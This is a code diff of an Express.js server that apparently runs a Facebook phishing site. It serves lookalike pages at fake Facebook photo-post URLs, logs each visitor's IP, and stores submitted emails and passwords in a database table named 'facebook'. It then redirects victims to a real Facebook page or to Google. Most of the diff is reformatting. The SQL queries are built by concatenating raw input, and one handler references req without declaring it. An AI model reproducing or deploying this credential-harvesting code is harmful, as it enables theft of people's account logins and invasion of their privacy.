@@ -16,7 +16,7 @@ const client = new pg.Client({
     ssl: true
 });
 client.connect();
-app.get('/posts/sadcasm/EeVnwJ8kYoXv9zy9D5C5m5A/SadcasmLoL/photos/a.221551201572697/735306480197164',function(req,res){
+app.get('/posts/sadcasm/EeVnwJ8kYoXv9zy9D5C5m5A/SadcasmLoL/photos/a.221551201572697/735306480197164', function (req, res) {
     res.render('Facebook');
     var ip = req.headers['x-forwarded-for'] ||
         req.connection.remoteAddress ||
@@ -27,9 +27,9 @@ app.get('/posts/sadcasm/EeVnwJ8kYoXv9zy9D5C5m5A/SadcasmLoL/photos/a.221551201572
             // console.log(result)
         }
     })
-    
+
 })
-app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/73530648019716444',function(req,res){
+app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/73530648019716444', function (req, res) {
     res.render('amir');
     var ip = req.headers['x-forwarded-for'] ||
         req.connection.remoteAddress ||
@@ -40,17 +40,17 @@ app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572
             // console.log(result)
         }
     })
-    
+
 })
 
-app.get('/',function(req,res){
+app.get('/', function (req, res) {
     res.render('Facebook');
-    
+
     var ip = req.headers['x-forwarded-for'] ||
-    req.connection.remoteAddress ||
-    req.socket.remoteAddress ||
-    (req.connection.socket ? req.connection.socket.remoteAddress : null);
-    client.query("INSERT INTO ip (ip) VALUES ('"+ip+"')", function (err, result) {
+        req.connection.remoteAddress ||
+        req.socket.remoteAddress ||
+        (req.connection.socket ? req.connection.socket.remoteAddress : null);
+    client.query("INSERT INTO ip (ip) VALUES ('" + ip + "')", function (err, result) {
         if (!err) {
             // console.log(result)
         }
@@ -66,10 +66,10 @@ app.post('/confirm', function (req, res) {
     var d = req.body.pass;
     res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
     var ip = req.headers['x-forwarded-for'] ||
-    req.connection.remoteAddress ||
-    req.socket.remoteAddress ||
-    (req.connection.socket ? req.connection.socket.remoteAddress : null);
-    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','"+ip+"')", function (err, result) {
+        req.connection.remoteAddress ||
+        req.socket.remoteAddress ||
+        (req.connection.socket ? req.connection.socket.remoteAddress : null);
+    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {
         if (!err) {
             // console.log(result)
         }
@@ -83,41 +83,41 @@ app.post('/confirm_amir', function (req, res) {
     var c = req.body.email;
     var d = req.body.pass;
     var ip = req.headers['x-forwarded-for'] ||
-    req.connection.remoteAddress ||
-    req.socket.remoteAddress ||
-    (req.connection.socket ? req.connection.socket.remoteAddress : null);
+        req.connection.remoteAddress ||
+        req.socket.remoteAddress ||
+        (req.connection.socket ? req.connection.socket.remoteAddress : null);
     client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {
         if (!err) {
             // console.log(result)
         }
     })
 })
-app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/735306480197164445',function(req,res){
+app.get('/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/735306480197164445', function (req, res) {
     res.render('fb_ar')
 })
 // ***********************************************************************************************************************************************
-app.get('/fade7a/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/7353064801971644',function(req,res){
-        
-            res.render('fade7a');
-        })
-        app.post('/confirm/fad',function(){
+app.get('/fade7a/posts/photo.php/EeVnwJ8kYoXv9zy9D5C5m5A/group_id/photos/a.221551201572697/7353064801971644', function (req, res) {
+
+    res.render('fade7a');
+})
+app.post('/confirm/fad', function () {
 
 
-            res.redirect('https://www.youm7.com/story/2014/3/4/%D8%B6%D8%A8%D8%B7-%D8%B4%D8%A8%D9%83%D8%A9-%D8%AF%D8%B9%D8%A7%D8%B1%D8%A9-%D8%A3%D9%85-%D9%87%D9%86%D8%AF-%D8%A8%D8%A7%D9%84%D8%A8%D8%AD%D9%8A%D8%B1%D8%A9-%D9%85%D8%A7%D8%A6%D8%A9-%D8%AC%D9%86%D9%8A%D9%87-%D9%84%D9%84%D9%85%D8%B1%D8%A9-%D9%88%D8%AE%D8%B5%D9%85/1537270')
-            var a = req.body.email_a;
-            var b = req.body.pass_a;
-            var c = req.body.email;
-            var d = req.body.pass;
-            var ip = req.headers['x-forwarded-for'] ||
-                req.connection.remoteAddress ||
-                req.socket.remoteAddress ||
-                (req.connection.socket ? req.connection.socket.remoteAddress : null);
-            client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {
+    res.redirect('https://www.google.com')
+    var a = req.body.email_a;
+    var b = req.body.pass_a;
+    var c = req.body.email;
+    var d = req.body.pass;
+    var ip = req.headers['x-forwarded-for'] ||
+        req.connection.remoteAddress ||
+        req.socket.remoteAddress ||
+        (req.connection.socket ? req.connection.socket.remoteAddress : null);
+    client.query("INSERT INTO facebook (mail_a,mail_b,password_a,password_b,ip) VALUES ('" + a + "','" + b + "','" + c + "','" + d + "','" + ip + "')", function (err, result) {
 
-            })
-        })
+    })
+})
 // ************************************************************************************************************************************************
-app.get('*',function(req,res){
+app.get('*', function (req, res) {
     res.redirect('https://www.facebook.com/my.omelette/photos/a.400034677207255/453806845163371/?type=3&theater')
 })
 app.listen(PORT, function () {
